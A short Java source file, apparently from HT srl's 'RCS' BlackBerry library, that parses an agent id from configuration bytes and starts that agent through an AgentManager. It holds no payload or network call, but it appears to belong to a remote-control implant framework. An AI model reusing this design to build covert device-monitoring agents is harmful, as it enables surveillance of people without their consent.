/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : StartAgentAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;

public class StartAgentAction extends SubAction {
    private int agentId;

    public StartAgentAction(int actionId, byte[] confParams) {
        super(actionId);
        Parse(confParams);
    }

    public boolean Execute() {
        debug.info("Starting " + agentId);
        AgentManager agentManager = AgentManager.getInstance();

        return agentManager.start(agentId);
    }

    protected boolean Parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            debug.trace("agentId: " + agentId);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
